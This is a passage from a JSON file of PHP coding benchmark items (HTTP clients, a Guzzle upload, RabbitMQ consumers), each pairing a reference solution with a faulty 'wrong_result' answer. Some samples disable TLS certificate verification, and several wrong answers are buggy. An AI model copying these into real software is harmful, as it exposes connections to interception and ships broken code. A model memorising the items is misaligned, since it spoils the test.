CURLOPT_PROXY, $this->proxy['host'].':'.$this->proxy['port']);\n                if (isset($this->proxy['user']) && isset($this->proxy['password'])) {\n                    curl_setopt($this->curl, CURLOPT_PROXYUSERPWD, $this->proxy['user'].':'.$this->proxy['password']);\n                }\n            }\n            if ($this->scheme == 'https') {\n                curl_setopt($this->curl, CURLOPT_SSL_VERIFYPEER, false);\n                curl_setopt($this->curl, CURLOPT_SSL_VERIFYHOST, false);\n            }\n            return true;\n        } else {\n            $errno = 0;\n            $errstr = '';\n            $this->socket = fsockopen($this->host, $this->port, $errno, $errstr, $this->connection_timeout);\n            if (!$this->socket) {\n                return false;\n            }\n            stream_set_timeout($this->socket, $this->response_timeout);\n            return true;\n        }\n    }\n\n    public function send(string $data, int $timeout=0, int $response_timeout=30, array $cookies=null): mixed {\n        $this->outgoing_payload = $data;\n        $this->cookies = $cookies;\n        if ($this->connect($timeout, $response_timeout)) {\n            $this->sendRequest($data, $cookies);\n            return $this->getResponse();\n        } else {\n            return false;\n        }\n    }\n\n    private function sendRequest(string $data, array $cookies=null): bool {\n        if ($this->use_curl) {\n            curl_setopt($this->curl, CURLOPT_POSTFIELDS, $data);\n            if ($cookies) {\n                $cookie_str = '';\n                foreach ($cookies as $name => $value) {\n                    $cookie_str .= $name.'='.$value.'; ';\n                }\n                curl_setopt($this->curl, CURLOPT_COOKIE, $cookie_str);\n            }\n            curl_setopt($this->curl, CURLOPT_HTTPHEADER, $this->outgoing_headers);\n            $this->incoming_payload = curl_exec($this->curl);\n            $this->incoming_headers = explode(\"\\r\\n\", substr($this->incoming_payload, 0, curl_getinfo($this->curl, CURLINFO_HEADER_SIZE)));\n            $this->incoming_payload = substr($this->incoming_payload, curl_getinfo($this->curl, CURLINFO_HEADER_SIZE));\n            if (curl_errno($this->curl)) {\n                return false;\n            }\n            return true;\n        } else {\n            $request = $this->request_method.' '.$this->path.' HTTP/'.$this->protocol_version.\"\\r\\n\";\n            $request .= 'Host: '.$this->host.($this->port != 80 ? ':'.$this->port : '').\"\\r\\n\";\n            if ($cookies) {\n                $cookie_str = '';\n                foreach ($cookies as $name => $value) {\n                    $cookie_str .= $name.'='.$value.'; ';\n                }\n                $request .= 'Cookie: '.$cookie_str.\"\\r\\n\";\n            }\n            foreach ($this->outgoing_headers as $name => $value) {\n                $request .= $name.': '.$value.\"\\r\\n\";\n            }\n            $request .= \"\\r\\n\".$data;\n            fwrite($this->socket, $request);\n            return true;\n        }\n    }\n\n    private function getResponse(): string|bool {\n        if ($this->use_curl) {\n            return $this->incoming_payload;\n        } else {\n            $response = '';\n            while (!feof($this->socket)) {\n                $response .= fgets($this->socket, 4096);\n                if (strpos($response, \"\\r\\n\\r\\n\") !== false) {\n                    break;\n                }\n            }\n            $this->incoming_headers = explode(\"\\r\\n\", substr($response, 0, strpos($response, \"\\r\\n\\r\\n\")));\n            $this->incoming_payload = substr($response, strpos($response, \"\\r\\n\\r\\n\")+4);\n            return $this->incoming_payload;\n        }\n    }\n\n    public function setHeader(string $name, string $value): void {\n        $this->outgoing_headers[$name] = $value;\n    }\n\n    public function setCurlOption(mixed $option, mixed $value): void {\n        if ($this->use_curl) {\n            curl_setopt($this->curl, $option, $value);\n        }\n    }\n\n    private function parseUrl(): void {\n        $url_parts = parse_url($this->url);\n        $this->scheme = $url_parts['scheme'];\n        $this->host = $url_parts['host'];\n        $this->port = isset($url_parts['port']) ? $url_parts['port'] : ($this->scheme == 'https' ? 443 : 80);\n        $this->path = isset($url_parts['path']) ? $url_parts['path'] : '/';\n        $this->uri = $url_parts['scheme'].'://'.$url_parts['host'].(isset($url_parts['port']) ? ':'.$url_parts['port'] : '').$url_parts['path'];\n    }\n\n    private function parseCookie(string $cookie_str): array|bool {\n        $cookies = array();\n        $cookie_parts = explode(';', $cookie_str);\n        foreach ($cookie_parts as $part) {\n            $part = trim($part);\n            if (strpos($part, '=') !== false) {\n                list($name, $value) = explode('=', $part, 2);\n                $cookies[$name] = $value;\n            }\n        }\n        return $cookies;\n    }\n}\n```"
  },
  {
    "Task_id": 11,
    "Instruction": "Task Description: Create a PHP class that handles file uploads to a specified host using HTTP PUT requests with Guzzle HTTP client, including CRC32 checksum verification.\n\nClass Description: ImageX is a class that extends V4Curl and provides functionality to upload files to a remote server. It handles file validation, CRC32 checksum generation, and HTTP communication using Guzzle's HTTP client.\n\nAttributes: (No explicit attributes in this class - it inherits from V4Curl)\n\nMethods:\nupload: [upload](string $uploadHost, array $storeInfo, string $filePath) -> int - Uploads a file to the specified host using HTTP PUT request. Validates file existence, calculates CRC32 checksum, and sends the file with appropriate headers. Returns 0 on success, -1 if file doesn't exist, or -2 if upload fails.\n\nParameters:\n- $uploadHost: string - The host address to upload to\n- $storeInfo: array - Contains 'StoreUri' for upload endpoint and 'Auth' for authorization\n- $filePath: string - Local path to the file to be uploaded\n\nReturn:\n- int: 0 for success, -1 for file not found, -2 for upload failure",
    "Canonical_solution": "use Volc\\Base\\V4Curl;\nuse GuzzleHttp\\Client;\n\nclass ImageX extends V4Curl\n{\n    public function upload(string $uploadHost, $storeInfo, string $filePath)\n    {\n        if (!file_exists($filePath)) {\n            return -1;\n        }\n        $content = file_get_contents($filePath);\n        $crc32 = sprintf(\"%08x\", crc32($content));\n\n        $body = fopen($filePath, \"r\");\n        $tosClient = new Client([\n            'base_uri' => \"https://\" . $uploadHost,\n            'timeout' => 5.0,\n        ]);\n\n        $response = $tosClient->request('PUT', $storeInfo[\"StoreUri\"], [\"body\" => $body, \"headers\" => ['Authorization' => $storeInfo[\"Auth\"], 'Content-CRC32' => $crc32]]);\n        $uploadResponse = json_decode((string) $response->getBody(), true);\n        if (!isset($uploadResponse[\"success\"]) || $uploadResponse[\"success\"] != 0) {\n            return -2;\n        }\n        return 0;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 133,
    "wrong_result": "```php\nclass ImageX extends V4Curl {\n    public function upload($uploadHost, $storeInfo, $filePath) {\n        if (!file_exists($filePath)) {\n            return -1;\n        }\n\n        $crc32 = hash_file('crc32b', $filePath);\n        $headers = [\n            'Content-Type' => mime_content_type($filePath),\n            'Content-Length' => filesize($filePath),\n            'X-Crc32' => $crc32,\n            'Authorization' => $storeInfo['Auth']\n        ];\n\n        $client = new GuzzleHttp\\Client();\n        try {\n            $response = $client->put($storeInfo['StoreUri'], [\n                'headers' => $headers,\n                'body' => fopen($filePath, 'r')\n            ]);\n            if ($response->getStatusCode() == 200) {\n                return 0;\n            } else {\n                return -2;\n            }\n        } catch (GuzzleHttp\\Exception\\RequestException $e) {\n            return -2;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 112,
    "Instruction": "Task Description: Create a PHP class that implements an HTTP client using low-level socket operations (fsockopen) to send HTTP requests and handle responses, with logging capabilities.\n\nClass Description: SocketHttpClient is a PSR-compatible HTTP client that establishes direct socket connections to HTTP servers, sends requests, and processes responses. It implements both a custom HTTP client interface and PSR-18's ClientInterface, while also supporting PSR-3 logging.\n\nAttributes:\n- logger: [LoggerInterface] - PSR-3 logger instance for tracking connection attempts, errors, and debug information\n\nMethods:\n- __construct([LoggerInterface $logger]) -> [void] - Initializes the client with a PSR-3 logger instance\n- sendRequest([RequestInterface $request]) -> [ResponseInterface] - Sends an HTTP request and returns the response. Handles both HTTP and HTTPS connections, processes headers and body, and manages socket lifecycle. Returns a PSR-7 response object.",
    "Canonical_solution": "use Mpdf\\Log\\Context as LogContext;\nuse Mpdf\\PsrHttpMessageShim\\Response;\nuse Mpdf\\PsrHttpMessageShim\\Stream;\nuse Mpdf\\PsrLogAwareTrait\\PsrLogAwareTrait;\nuse Psr\\Http\\Message\\RequestInterface;\nuse Psr\\Log\\LoggerInterface;\n\nclass SocketHttpClient implements \\Mpdf\\Http\\ClientInterface, \\Psr\\Log\\LoggerAwareInterface\n{\n    use PsrLogAwareTrait;\n\n    public function __construct(LoggerInterface $logger)\n    {\n        $this->logger = $logger;\n    }\n\n    public function sendRequest(RequestInterface $request)\n    {\n        if (null === $request->getUri()) {\n            return (new Response());\n        }\n\n        $url = $request->getUri();\n\n        if (is_string($url)) {\n            $url = new Uri($url);\n        }\n\n        $timeout = 1;\n\n        $file = $url->getPath() ?: '/';\n        $scheme = $url->getScheme();\n        $port = $url->getPort() ?: 80;\n        $prefix = '';\n\n        if ($scheme === 'https') {\n            $prefix = 'ssl://';\n            $port = $url->getPort() ?: 443;\n        }\n\n        $query = $url->getQuery();\n        if ($query) {\n            $file .= '?' . $query;\n        }\n\n        $socketPath = $prefix . $url->getHost();\n\n        $this->logger->debug(sprintf('Opening socket on %s:%s of URL \"%s\"', $socketPath, $port, $request->getUri()), ['context' => LogContext::REMOTE_CONTENT]);\n\n        $response = new Response();\n\n        if (!($fh = @fsockopen($socketPath, $port, $errno, $errstr, $timeout))) {\n            $this->logger->error(sprintf('Socket error \"%s\": \"%s\"', $errno, $errstr), ['context' => LogContext::REMOTE_CONTENT]);\n            return $response;\n        }\n\n        $getRequest = 'GET ' . $file . ' HTTP/1.1' . \"\\r\\n\" .\n            'Host: ' . $url->getHost() . \" \\r\\n\" .\n            'Connection: close' . \"\\r\\n\\r\\n\";\n\n        fwrite($fh, $getRequest);\n\n        $httpHeader = fgets($fh, 1024);\n        if (!$httpHeader) {\n            return $response;\n        }\n\n        preg_match('@HTTP/(?P<protocolVersion>[\\d\\.]+) (?P<httpStatusCode>[\\d]+) .*@', $httpHeader, $parsedHeader);\n\n        if (!$parsedHeader) {\n            return $response;\n        }\n\n        $response = $response->withStatus($parsedHeader['httpStatusCode']);\n\n        while (!feof($fh)) {\n            $s = fgets($fh, 1024);\n            if ($s === \"\\r\\n\") {\n                break;\n            }\n            preg_match('/^(?P<headerName>.*?): ?(?P<headerValue>.*)$/', $s, $parsedHeader);\n            if (!$parsedHeader) {\n                continue;\n            }\n            $response = $response->withHeader($parsedHeader['headerName'], trim($parsedHeader['headerValue']));\n        }\n\n        $body = '';\n\n        while (!feof($fh)) {\n            $line = fgets($fh, 1024);\n            $body .= $line;\n        }\n\n        fclose($fh);\n\n        $stream = Stream::create($body);\n        $stream->rewind();\n\n        return $response\n            ->withBody($stream);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 131,
    "wrong_result": "```php\n<?php\n\nuse Psr\\Http\\Message\\RequestInterface;\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Log\\LoggerInterface;\n\nclass SocketHttpClient implements HttpClientInterface, \\Psr\\Http\\Client\\ClientInterface\n{\n    private $logger;\n\n    public function __construct(LoggerInterface $logger = null)\n    {\n        $this->logger = $logger;\n    }\n\n    public function sendRequest(RequestInterface $request): ResponseInterface\n    {\n        $uri = $request->getUri();\n        $host = $uri->getHost();\n        $port = $uri->getPort() ?: ($uri->getScheme() === 'https' ? 443 : 80);\n        $path = $uri->getPath() ?: '/';\n        $query = $uri->getQuery() ? '?' . $uri->getQuery() : '';\n        $method = $request->getMethod();\n        $headers = $request->getHeaders();\n        $body = (string) $request->getBody();\n\n        $socketContextOptions = [\n            'ssl' => [\n                'verify_peer' => false,\n                'verify_peer_name' => false,\n            ],\n        ];\n\n        $socket = stream_socket_client(\n            $uri->getScheme() === 'https' ? \"ssl://$host:$port\" : \"$host:$port\",\n            $errno,\n            $errstr,\n            10,\n            STREAM_CLIENT_CONNECT,\n            stream_context_create($socketContextOptions)\n        );\n\n        if (!$socket) {\n            throw new \\RuntimeException(\"Failed to connect to $host:$port ($errstr)\");\n        }\n\n        if ($this->logger) {\n            $this->logger->info(\"Connecting to $host:$port\");\n        }\n\n        $requestLine = \"$method $path$query HTTP/1.1\\r\\n\";\n        $headerString = '';\n        foreach ($headers as $name => $values) {\n            foreach ($values as $value) {\n                $headerString .= \"$name: $value\\r\\n\";\n            }\n        }\n        $headerString .= \"\\r\\n\";\n\n        fwrite($socket, $requestLine . $headerString . $body);\n\n        $responseHeaders = [];\n        $responseBody = '';\n        while (!feof($socket)) {\n            $line = fgets($socket);\n            if ($line === \"\\r\\n\") {\n                break;\n            }\n            if (strpos($line, ':') !== false) {\n                list($name, $value) = explode(':', $line, 2);\n                $responseHeaders[strtolower(trim($name))] = trim($value);\n            }\n        }\n\n        while (!feof($socket)) {\n            $responseBody .= fread($socket, 8192);\n        }\n\n        fclose($socket);\n\n        if ($this->logger) {\n            $this->logger->info(\"Received response from $host:$port\");\n        }\n\n        $response = new Response(\n            $responseHeaders['status-code'] ?? 500,\n            $responseHeaders,\n            $responseBody\n        );\n\n        return $response;\n    }\n}\n```"
  },
  {
    "Task_id": 113,
    "Instruction": "Task Description: Create a function that implements a RabbitMQ consumer in PHP to process messages from a specified queue.\n\nFunction Description: The function establishes a connection to a RabbitMQ server, declares a queue and exchange, binds them, and starts consuming messages. It processes each message by printing its content and acknowledging it. The consumer stops when it receives a 'quit' message or when the channel is no longer consuming. The function includes proper cleanup by closing the channel and connection upon shutdown.\n\nInput:\n- $host (string): The hostname of the RabbitMQ server\n- $port (int): The port number of the RabbitMQ server\n- $user (string): The username for RabbitMQ authentication\n- $pass (string): The password for RabbitMQ authentication\n- $vhost (string): The virtual host to connect to\n- $exchange (string): The name of the exchange to declare\n- $queue (string): The name of the queue to declare and consume from\n- $consumerTag (string): The identifier for this consumer\n\nOutput: None (The function processes messages asynchronously and does not return a value)",
    "Canonical_solution": "function start_rabbitmq_consumer($host, $port, $user, $pass, $vhost, $exchange, $queue, $consumerTag)\n{\n    require_once __DIR__ . '/vendor/autoload.php';\n    use PhpAmqpLib\\Connection\\AMQPStreamConnection;\n    use PhpAmqpLib\\Exchange\\AMQPExchangeType;\n    use PhpAmqpLib\\Message\\AMQPMessage;\n\n    $connection = new AMQPStreamConnection($host, $port, $user, $pass, $vhost);\n    $channel = $connection->channel();\n\n    $channel->queue_declare($queue, false, true, false, false);\n    $channel->exchange_declare($exchange, AMQPExchangeType::DIRECT, false, true, false);\n    $channel->queue_bind($queue, $exchange);\n\n    function process_message($message)\n    {\n        echo \"\\n--------\\n\";\n        echo $message->body;\n        echo \"\\n--------\\n\";\n\n        $message->ack();\n\n        if ($message->body === 'quit') {\n            $message->getChannel()->basic_cancel($message->getConsumerTag());\n        }\n    }\n\n    $channel->basic_consume($queue, $consumerTag, false, false, false, false, 'process_message');\n\n    function shutdown($channel, $connection)\n    {\n        $channel->close();\n        $connection->close();\n    }\n\n    register_shutdown_function('shutdown', $channel, $connection);\n\n    while ($channel->is_consuming()) {\n        $channel->wait(null, true);\n        usleep(300000);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 143,
    "wrong_result": "```php\nfunction consumeRabbitMQ($host, $port, $user, $pass, $vhost, $exchange, $queue, $consumerTag) {\n    $connection = new AMQPConnection([\n        'host' => $host,\n        'port' => $port,\n        'login' => $user,\n        'password' => $pass,\n        'vhost' => $vhost\n    ]);\n    $connection->connect();\n    $channel = new AMQPChannel($connection);\n    $exchange = new AMQPExchange($channel);\n    $exchange->setName($exchange);\n    $exchange->setType(AMQP_EX_TYPE_DIRECT);\n    $exchange->declareExchange();\n    $queue = new AMQPQueue($channel);\n    $queue->setName($queue);\n    $queue->declareQueue();\n    $queue->bind($exchange->getName(), $queue);\n    $queue->consume(function($envelope, $queue) use ($connection, $channel, $exchange, $queue, $consumerTag) {\n        $msg = $envelope->getBody();\n        if ($msg == 'quit') {\n            $queue->cancel($consumerTag);\n            $channel->close();\n            $connection->disconnect();\n            exit();\n        }\n        echo $msg . \"\\n\";\n        $queue->ack($envelope->getDeliveryTag());\n    }, AMQP_AUTOACK, $consumerTag);\n}\n```"
  },
  {
    "Task_id": 114,
    "Instruction": "Task Description: Create a RabbitMQ consumer class in PHP that connects to a RabbitMQ server, declares a queue and exchange, binds them, and processes incoming messages until a termination signal is received.\n\nClass Description: The RabbitMQConsumer class handles the consumption of messages from a RabbitMQ queue. It establishes a connection to the server, sets up the necessary queue and exchange, processes messages, and provides shutdown functionality.\n\nAttributes:\n- msgCount: [int] - Tracks the number of messages processed\n- startTime: [float|null] - Records the start time of message processing\n- conn: [AMQPStreamConnection] - Holds the RabbitMQ server connection\n- ch: [AMQPChannel] - Represents the communication channel\n- exchange: [string] - Name of the exchange to bind to\n- queue: [string] - Name of the queue to consume from\n- consumer_tag: [string] - Identifier for the consumer (empty in this implementation)\n\nMethods:\n- __construct() -> [void] - Initializes the RabbitMQ connection, channel, exchange, and queue\n- process_message([AMQPMessage] $msg) -> [void] - Processes incoming messages and handles termination signal\n- startConsuming() -> [void] - Starts consuming messages from the queue\n- shutdown() -> [void] - Closes the channel and connection cleanly",
    "Canonical_solution": "use PhpAmqpLib\\Connection\\AMQPStreamConnection;\nuse PhpAmqpLib\\Message\\AMQPMessage;\n\nrequire __DIR__ . '/../vendor/autoload.php';\nrequire __DIR__ . '/../tests/config.php';\n\nclass RabbitMQConsumer\n{\n    protected $msgCount = 0;\n    protected $startTime = null;\n    protected $conn;\n    protected $ch;\n    protected $exchange = 'bench_exchange';\n    protected $queue = 'bench_queue';\n    protected $consumer_tag = '';\n\n    public function __construct()\n    {\n        $this->conn = new AMQPStreamConnection(HOST, PORT, USER, PASS, VHOST);\n        $this->ch = $this->conn->channel();\n        $this->ch->queue_declare($this->queue, false, false, false, false);\n        $this->ch->exchange_declare($this->exchange, 'direct', false, false, false);\n        $this->ch->queue_bind($this->queue, $this->exchange);\n    }\n\n    public function process_message($msg)\n    {\n        if ($this->startTime === null) {\n            $this->startTime = microtime(true);\n        }\n\n        if ($msg->body == 'quit') {\n            echo sprintf(\"Pid: %s, Count: %s, Time: %.4f\\n\", getmypid(), $this->msgCount, microtime(true) - $this->startTime);\n            $this->shutdown();\n            die;\n        }\n        $this->msgCount++;\n    }\n\n    public function startConsuming()\n    {\n        $this->ch->basic_consume($this->queue, '', false, true, false, false, array($this, 'process_message'));\n        while ($this->ch->is_consuming()) {\n            $this->ch->wait();\n        }\n    }\n\n    protected function shutdown()\n    {\n        $this->ch->close();\n        $this->conn->close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 143,
    "wrong_result": "```php\nclass RabbitMQConsumer {\n    private $msgCount = 0;\n    private $startTime = null;\n    private $conn;\n    private $ch;\n    private $exchange;\n    private $queue;\n    private $consumer_tag = '';\n\n    public function __construct() {\n        $this->conn = new AMQPStreamConnection('localhost', 5672, 'guest', 'guest');\n        $this->ch = $this->conn->channel();\n        $this->exchange = 'test_exchange';\n        $this->queue = 'test_queue';\n\n        $this->ch->exchange_declare($this->exchange, 'direct', false, true, false);\n        $this->ch->queue_declare($this->queue, false, true, false, false);\n        $this->ch->queue_bind($this->queue, $this->exchange, 'routing_key');\n    }\n\n    public function process_message($msg) {\n        $this->msgCount++;\n        if ($this->msgCount == 1) {\n            $this->startTime = microtime(true);\n        }\n        echo \" [x] Received \", $msg->body, \"\\n\";\n        if ($msg->body == 'exit') {\n            $this->shutdown();\n        }\n    }\n\n    public function startConsuming() {\n        $callback = array($this, 'process_message');\n        $this->ch->basic_consume($this->queue, $this->consumer_tag, false, true, false, false, $callback);\n        while ($this->ch->is_open()) {\n            $this->ch->wait();\n        }\n    }\n\n    public function shutdown() {\n        $this->ch->close();\n        $this->conn->close();\n        echo \" [x] Shutdown\\n\";\n    }\n}\n```"
  },
  {
    "Task_id": 115,
    "Instruction": "Task Description: Create a PHP function that implements a RabbitMQ consumer to process messages from a specified queue, with the ability to acknowledge or reject messages based on their content, and properly handle connection shutdown.\n\nFunction Description: The function establishes a connection to a RabbitMQ server, declares a queue and exchange, binds them together, and starts consuming messages. It processes each message by acknowledging \"good\" messages and rejecting others. If the message body is \"quit\", it stops consuming. The function includes proper cleanup by closing the channel and connection on shutdown.\n\nInput:\n- $host: string - RabbitMQ server hostname\n- $port: int - RabbitMQ server port\n- $user: string - RabbitMQ username\n- $pass: string - RabbitMQ password  \n- $vhost: string - RabbitMQ virtual host\n- $exchange: string - Exchange name to bind to\n- $queue: string - Queue name to consume from\n- $consumerTag: string - Identifier for this consumer\n\nOutput: None (This is a long-running consumer process that handles messages asynchronously)",
    "Canonical_solution": "function start_rabbitmq_consumer($host, $port, $user, $pass, $vhost, $exchange, $queue, $consumerTag)\n{\n    require_once __DIR__ . '/config.php';\n    use PhpAmqpLib\\Connection\\AMQPStreamConnection;\n    use PhpAmqpLib\\Exchange\\AMQPExchangeType;\n\n    $connection = new AMQPStreamConnection($host, $port, $user, $pass, $vhost);\n    $channel = $connection->channel();\n\n    $channel->queue_declare($queue, false, true, false, false);\n    $channel->exchange_declare($exchange, AMQPExchangeType::DIRECT, false, true, false);\n    $channel->queue_bind($queue, $exchange);\n\n    function process_message($message)\n    {\n        if ($message->body == 'good') {\n            $message->ack();\n        } else {\n            $message->nack();\n        }\n\n        if ($message->body === 'quit') {\n            $message->getChannel()->basic_cancel($message->getConsumerTag());\n        }\n    }\n\n    $channel->basic_consume($queue, $consumerTag, false, false, false, false, 'process_message');\n\n    function shutdown($channel, $connection)\n    {\n        $channel->close();\n        $connection->close();\n    }\n\n    register_shutdown_function('shutdown', $channel, $connection);\n\n    $channel->consume();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 143,
    "wrong_result": "```php\nfunction rabbitmq_consumer($host, $port, $user, $pass, $vhost, $exchange, $queue, $consumerTag) {\n    $connection = new AMQPConnection([\n        'host' => $host,\n        'port' => $port,\n        'vhost' => $vhost,\n        'login' => $user,\n        'password' => $pass\n    ]);\n    $connection->connect();\n    $channel = new AMQPChannel($connection);\n    $exchange = new AMQPExchange($channel);\n    $exchange->setName($exchange);\n    $exchange->setType(AMQP_EX_TYPE_DIRECT);\n    $exchange->declareExchange();\n    $queue = new AMQPQueue($channel);\n    $queue->setName($queue);\n    $queue->declareQueue();\n    $queue->bind($exchange->getName(), $queue);\n    $queue->consume(function($envelope, $queue) use ($connection, $channel, $exchange, $queue, $consumerTag) {\n        $message = $envelope->getBody();\n        if ($message == 'quit') {\n            $queue->cancel($consumerTag);\n            $channel->close();\n            $connection->disconnect();\n            exit;\n        }\n        if ($message == 'good') {\n            $envelope->ack();\n        } else {\n            $envelope->reject(false);\n        }\n    }, AMQP_AUTOACK, $consumerTag);\n}\n```"
  },
  {
    "Task_id": 116,
    "Instruction": "Task Description: Implement a PHP function that establishes a RabbitMQ consumer to process messages from a specified queue. The function should handle connection setup, message consumption, and proper cleanup.\n\nFunction Description: The function `start_rabbitmq_consumer` initializes a RabbitMQ consumer that connects to a specified server, declares a queue and exchange, binds them, and starts consuming messages. It processes each message using a callback function and handles graceful shutdown.\n\nInput:\n- `$host` (string): RabbitMQ server hostname or IP address\n- `$port` (int): RabbitMQ server port number\n- `$user` (string): RabbitMQ username for authentication\n- `$pass` (string): RabbitMQ password for authentication\n- `$vhost` (string): RabbitMQ virtual host\n- `$exchange` (string): Name of the exchange to bind to\n- `$queue` (string): Name of the queue to consume messages from\n\nOutput: None (The function runs continuously until terminated or until receiving a 'quit' message)",
    "Canonical_solution": "function start_rabbitmq_consumer($host, $port, $user, $pass, $vhost, $exchange, $queue)\n{\n    require_once __DIR__ . '/config.php';\n    use PhpAmqpLib\\Connection\\AMQPStreamConnection;\n    use PhpAmqpLib\\Exchange\\AMQPExchangeType;\n\n    $consumerTag = 'consumer' . getmypid();\n\n    $connection = new AMQPStreamConnection($host, $port, $user, $pass, $vhost);\n    $channel = $connection->channel();\n\n    $channel->queue_declare($queue, false, false, false, true);\n    $channel->exchange_declare($exchange, AMQPExchangeType::FANOUT, false, false, true);\n    $channel->queue_bind($queue, $exchange);\n\n    function process_message($message)\n    {\n        echo \"\\n--------\\n\";\n        echo $message->body;\n        echo \"\\n--------\\n\";\n\n        $message->ack();\n\n        if ($message->body === 'quit') {\n            $message->getChannel()->basic_cancel($message->getConsumerTag());\n        }\n    }\n\n    $channel->basic_consume($queue, $consumerTag, false, false, false, false, 'process_message');\n\n    function shutdown($channel, $connection)\n    {\n        $channel->close();\n        $connection->close();\n    }\n\n    register_shutdown_function('shutdown', $channel, $connection);\n\n    $channel->consume();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 143,
    "wrong_result": "```php\nfunction start_rabbitmq_consumer($host, $port, $user, $pass, $vhost, $exchange, $queue) {\n    $connection = new AMQPConnection([\n        'host' => $host,\n        'port' => $port,\n        'vhost' => $vhost,\n        'login' => $user,\n        'password' => $pass\n    ]);\n\n    $connection->connect();\n\n    $channel = new AMQPChannel($connection);\n    $exchange = new AMQPExchange($channel);\n    $exchange->setName($exchange);\n    $exchange->setType(AMQP_EX_TYPE_DIRECT);\n    $exchange->declareExchange();\n\n    $queue = new AMQPQueue($channel);\n    $queue->setName($queue);\n    $queue->declareQueue();\n    $queue->bind($exchange->getName(), $queue);\n\n    $queue->consume(function($envelope, $queue) {\n        $msg = $envelope->getBody();\n        if ($msg === 'quit') {\n            $queue->cancel($envelope->getDeliveryTag());\n            exit;\n        }\n        // Process the message\n        echo \"Received message: $msg\\n\";\n    });\n\n    $connection->disconnect();\n}\n```"
  },
  {
    "Task_id": 117,
    "Instruction": "Task Description: Implement a PHP function that establishes a RabbitMQ consumer to process messages from a specified queue. The function should handle connection setup, message consumption, and proper cleanup.\n\nFunction Description: The function `start_rabbitmq_consumer` initializes a RabbitMQ consumer that connects to a specified server, declares a queue and exchange, binds them, and starts consuming messages. It processes each message using a callback function and handles graceful shutdown.\n\nInput:\n- `$host` (string): The hostname of the RabbitMQ server.\n- `$port` (int): The port number of the RabbitMQ server.\n- `$user` (string): The username for RabbitMQ authentication.\n- `$pass` (string): The password for RabbitMQ authentication.\n- `$vhost` (string): The virtual host to connect to.\n- `$exchange` (string): The name of the exchange to declare.\n- `$queue` (string): The name of the queue to declare and consume from.\n\nOutput: None. The function runs indefinitely until a 'quit' message is received or the process is terminated. Messages are processed and acknowledged, and connections are closed upon shutdown.",
    "Canonical_solution": "function start_rabbitmq_consumer($host, $port, $user, $pass, $vhost, $exchange, $queue)\n{\n    require_once __DIR__ . '/config.php';\n    use PhpAmqpLib\\Connection\\AMQPStreamConnection;\n    use PhpAmqpLib\\Exchange\\AMQPExchangeType;\n\n    $consumerTag = 'consumer' . getmypid();\n    $connection = new AMQPStreamConnection($host, $port, $user, $pass, $vhost);\n    $channel = $connection->channel();\n\n    $channel->queue_declare($queue, false, false, false, true);\n    $channel->exchange_declare($exchange, AMQPExchangeType::FANOUT, false, false, true);\n    $channel->queue_bind($queue, $exchange);\n\n    function process_message($message)\n    {\n        echo \"\\n--------\\n\";\n        echo $message->body;\n        echo \"\\n--------\\n\";\n\n        $message->ack();\n\n        if ($message->body === 'quit') {\n            $message->getChannel()->basic_cancel($message->getConsumerTag());\n        }\n    }\n\n    $channel->basic_consume($queue, $consumerTag, false, false, false, false, 'process_message');\n\n    function shutdown($channel, $connection)\n    {\n        $channel->close();\n        $connection->close();\n    }\n\n    register_shutdown_function('shutdown', $channel, $connection);\n    $channel->consume();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 143,
    "wrong_result": "```php\nfunction start_rabbitmq_consumer($host, $port, $user, $pass, $vhost, $exchange, $queue) {\n    $connection = new AMQPConnection([\n        'host' => $host,\n        'port' => $port,\n        'login' => $user,\n        'password' => $pass,\n        'vhost' => $vhost,\n    ]);\n\n    $connection->connect();\n\n    $channel = new AMQPChannel($connection);\n    $exchange = new AMQPExchange($channel);\n    $exchange->setName($exchange);\n    $exchange->setType(AMQP_EX_TYPE_DIRECT);\n    $exchange->declareExchange();\n\n    $queue = new AMQPQueue($channel);\n    $queue->setName($queue);\n    $queue->declareQueue();\n    $queue->bind($exchange->getName(), $queue);\n\n    $queue->consume(function ($envelope, $queue) {\n        $msg = $envelope->getBody();\n        if ($msg === 'quit') {\n            $queue->stopConsuming();\n        } else {\n            // Process the message\n            echo \"Received message: $msg\\n\";\n            // Acknowledge the message\n            $queue->ack($envelope->getDeliveryTag());\n        }\n    });\n\n    $connection->disconnect();\n}\n```"
  },
  {
    "Task_id": 118,
    "Instruction": "Task Description: Create a PHP function that consumes messages from a RabbitMQ queue using headers-based routing. The function should establish a connection to RabbitMQ, declare an exchange and queue, bind the queue with specified headers, and process incoming messages with a callback function.\n\nFunction Description: The function `consume_rabbitmq_messages` connects to a RabbitMQ server, sets up a headers-based exchange, declares a temporary queue, binds the queue with the provided headers, and starts consuming messages. It processes each message using a callback function that displays the message body and headers. The function handles timeouts gracefully and cleans up resources after processing.\n\nInput: \n- `$headers` (array): An array of strings in the format \"key=value\" representing the headers to bind the queue with.\n\nOutput: \n- Returns `true` if the function executes successfully.\n- Returns `false` if the input headers are empty.\n- Outputs message details to stdout and may write errors to stderr.",
    "Canonical_solution": "function consume_rabbitmq_messages($headers)\n{\n    require __DIR__ . '/config.php';\n    \n    use PhpAmqpLib\\Connection\\AMQPStreamConnection;\n    use PhpAmqpLib\\Exception\\AMQPTimeoutException;\n    use PhpAmqpLib\\Exchange\\AMQPExchangeType;\n    use PhpAmqpLib\\Message\\AMQPMessage;\n    use PhpAmqpLib\\Wire\\AMQPTable;\n\n    if (empty($headers)) {\n        file_put_contents('php://stderr', \"Usage: $argv[0] [header1=value1] [header2=value2]\\n\");\n        return false;\n    }\n\n    $connection = new AMQPStreamConnection(HOST, PORT, USER, PASS, VHOST);\n    $channel = $connection->channel();\n\n    $exchangeName = 'topic_headers_test';\n    $channel->exchange_declare($exchangeName, AMQPExchangeType::HEADERS);\n\n    list($queueName, ,) = $channel->queue_declare('', false, false, true);\n\n    $bindArguments = [];\n    foreach ($headers as $header) {\n        list ($key, $value) = explode('=', $header, 2);\n        $bindArguments[$key] = $value;\n    }\n\n    $channel->queue_bind($queueName, $exchangeName, '', false, new AMQPTable($bindArguments));\n\n    $callback = function (AMQPMessage $message) {\n        echo PHP_EOL . ' [x] ', 